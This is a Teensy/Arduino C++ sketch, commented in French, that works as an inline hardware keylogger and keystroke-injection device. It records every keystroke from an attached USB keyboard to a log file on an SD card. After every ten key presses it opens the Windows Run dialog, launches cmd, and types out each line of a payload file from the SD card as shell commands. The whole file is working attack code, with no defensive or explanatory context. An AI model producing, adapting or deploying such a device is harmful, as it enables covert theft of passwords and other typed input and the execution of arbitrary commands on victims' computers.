#include "USBHost_t36.h"
#include "SD.h"

// Définir les constantes
#define LOG_FILENAME "log.txt"
#define KEY_COUNT_LIMIT 10
#define PAYLOAD_FILENAME "payload.txt"

File dataLog;
USBHost myusb;
USBHub hub1(myusb);
KeyboardController keyboard1(myusb);
BluetoothController bluet(myusb);

USBHIDParser hid1(myusb);
USBHIDParser hid2(myusb);
USBHIDParser hid3(myusb);


// Ajoute un compteur pour les frappes de touches
int keyCount = 0;

void setup() {
  // Initialiser le port série
  Serial.begin(115200);
  while (!Serial) {}
  Serial.println("-- START --");

  // Initialiser l'objet USB
  myusb.begin();

  // Configurer le clavier pour détecter les pressions
  keyboard1.attachPress(onKeyPress);

  // Vérifier si la carte SD est présente
  if (!SD.begin(BUILTIN_SDCARD)) {
    Serial.println("Erreur d'initialisation de la carte SD.");
    while (1);
  }
  
  // Activer le clavier en mode HID (Human Interface Device)
  pinMode(0, INPUT_PULLUP);
  delay(1000);
  Keyboard.begin();
}

void loop() {
  myusb.Task();
}

void onKeyPress(int unicode) {
  // Convertir unicode en caractère
  char keyChar = (char)unicode;

  // Enregistrez les données sur la carte SD
  File logFile = SD.open(LOG_FILENAME, FILE_WRITE);
  if (logFile) {
    logFile.write(keyChar);
    logFile.close();
  } else {
    Serial.println("Erreur d'ouverture du fichier log.txt");
  }

  // Afficher la touche appuyée sur le moniteur série
  Serial.write(keyChar);

  // Envoyer la touche appuyée en mode HID
  Keyboard.write(keyChar);

    // Augmenter le compteur de touches
  keyCount++;

  // Si le compteur atteint la limite
  if (keyCount >= KEY_COUNT_LIMIT) {
    // Ouvrir le shell
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);  // Attendre que la fenêtre Exécuter s'ouvre
    Keyboard.println("cmd");
    delay(1000);  // Attendre que le shell s'ouvre

    // Envoyer la commande au shell
    Keyboard.println("dir");
    
    // Exécuter le payload
    executePayload();

    // Réinitialiser le compteur
    keyCount = 0;
  }
}
  void executePayload() {
    File payloadFile = SD.open(PAYLOAD_FILENAME, FILE_READ);
    if (payloadFile) {
      while (payloadFile.available()) {
        // Lire une ligne à partir du fichier
        String line = payloadFile.readStringUntil('\n');

        // Envoyer la ligne au shell
        Keyboard.println(line);
        delay(1000);  // Attendre que la commande s'exécute
      }
      payloadFile.close();
    } else {
      Serial.println("Erreur d'ouverture du fichier payload.txt");
    }
  }
